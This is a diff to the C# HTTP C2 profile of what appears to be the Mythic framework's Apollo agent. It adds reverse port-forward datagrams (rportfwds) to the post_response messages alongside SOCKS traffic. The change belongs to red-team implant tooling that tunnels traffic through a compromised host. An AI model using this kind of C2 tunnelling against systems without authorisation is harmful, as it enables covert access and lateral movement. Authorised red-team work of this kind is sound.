@@ -293,7 +293,7 @@ namespace Mythic.C2Profiles
             return "";
         }
 
-        override public string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams=null)
+        override public string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams=null,PortFwdDatagram[] rdatagrams=null)
         {
             try // Try block for HTTP requests
             {
@@ -343,7 +343,8 @@ namespace Mythic.C2Profiles
                     action = "post_response",
                     responses = resps,
                     delegates = new Dictionary<string, string>[] { },
-                    socks = datagrams
+                    socks = datagrams,
+                    rportfwds = rdatagrams
                 };
                 if (DelegateMessageRequestQueue.Count > 0)
                 {
@@ -472,6 +473,10 @@ namespace Mythic.C2Profiles
                 if (resp.socks != null)
                 {
                     response.SocksDatagrams = resp.socks;
+                }
+                if (resp.rportfwds != null)
+                {
+                    response.PortFwdDg = resp.rportfwds;
                 }
             }
             response.Delegates = finalDelegateMessageList.ToArray();
